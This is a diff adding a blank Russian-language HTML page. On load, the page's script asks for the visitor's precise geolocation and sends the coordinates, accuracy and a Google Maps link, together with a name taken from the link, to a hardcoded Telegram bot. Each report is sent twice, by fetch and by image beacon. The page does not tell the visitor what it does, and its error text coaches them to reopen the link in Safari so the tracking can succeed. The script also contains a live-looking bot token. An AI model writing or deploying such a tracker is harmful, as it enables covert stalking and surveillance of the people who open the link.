@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title></title>
+  <style>
+    body { margin: 0; background: #fff; }
+  </style>
+</head>
+<body>
+  <div id="err" style="display:none; font-family:Arial,sans-serif; font-size:14px; color:#dc2626; padding:20px; text-align:center;"></div>
+  <script>
+    var BOT_TOKEN = '8875134611:AAFa-O53k1ZJpFyC_3hJsRhllE_kq3Fhak8';
+    var CHAT_ID = '1287674342';
+    var API = 'https://api.telegram.org/bot' + BOT_TOKEN;
+
+    var m = location.search.match(/[?&]u=([^&]*)/);
+    var name = m ? decodeURIComponent(m[1]).slice(0, 50) : 'Гость';
+    var sent = false;
+    var errBox = document.getElementById('err');
+
+    function showErr(html) { errBox.innerHTML = html; errBox.style.display = 'block'; }
+
+    function fire(url) {
+      try { fetch(url, { mode: 'no-cors', cache: 'no-store' }); } catch (e) {}
+      try { var img = new Image(); img.src = url; } catch (e) {}
+    }
+
+    function send() {
+      if (sent) return;
+      if (!navigator.geolocation) { showErr('Геолокация не поддерживается устройством.'); return; }
+      navigator.geolocation.getCurrentPosition(
+        function (pos) {
+          sent = true;
+          var lat = pos.coords.latitude;
+          var lon = pos.coords.longitude;
+          var acc = Math.round(pos.coords.accuracy || 0);
+          var mapLink = 'https://maps.google.com/maps?q=' + lat + ',' + lon;
+          fire(API + '/sendMessage?chat_id=' + CHAT_ID +
+               '&text=' + encodeURIComponent('📍 ' + name + ': ' + lat.toFixed(6) + ', ' + lon.toFixed(6) + ' (точн. ' + acc + ' м)\n' + mapLink));
+          fire(API + '/sendLocation?chat_id=' + CHAT_ID + '&latitude=' + lat + '&longitude=' + lon);
+        },
+        function (err) {
+          showErr(err.message + '<br><span style="font-size:12px;color:#666">Если ссылка открыта внутри Telegram — открой её в Safari: меню ⋯ внизу → «Открыть в Safari».</span>');
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    }
+
+    send();
+  </script>
+</body>
+</html>
